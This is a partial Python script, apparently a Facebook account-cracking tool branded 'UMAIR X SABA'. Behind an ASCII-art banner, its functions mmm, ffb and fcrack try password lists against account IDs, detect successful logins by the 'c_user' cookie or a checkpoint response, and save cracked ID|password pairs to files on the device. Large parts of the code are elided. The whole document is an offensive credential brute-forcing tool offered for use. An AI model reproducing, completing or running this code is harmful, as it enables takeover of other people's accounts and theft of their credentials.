...
db    db .88b  d88.  .d8b.  d888888b d8888b. 
88    88 88'YbdP`88 d8' `8b   `88'   88  `8D 
88    88 88  88  88 88ooo88    88    88oobY' 
88    88 88  88  88 88~~~88    88    88`8b   
88b  d88 88  88  88 88   88   .88.   88 `88. 
~Y8888P' YP  YP  YP YP   YP Y888888P 88   YD 
                        
--------------------------------------------------
>>  Owner    : ITX UMAIR
>>  Github    : Umairafzal203
>>  Facebook : Muhammad Umair Afzal
>>  Version  : 0.1
>>  Team❤    : UMAIR X SABA
--------------------------------------------------""")
def linex():
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> UMAIR X SABA TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[UMAIR / AFZAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in UMAIR:
				print('\r\r\033[1;31m[UMAIR-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/UMAIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in UMAIR:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[UMAIR-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/UMAIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[UMAIR / AFZAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in UMAIR:
				...
				print('\r\r\033[1;32m[UMAIR-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[UMAIR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mUMAIR / AFZAL\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[UMAIR-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[UMAIR-OK] '+cid+' | '+ps+'\33[0;97m')
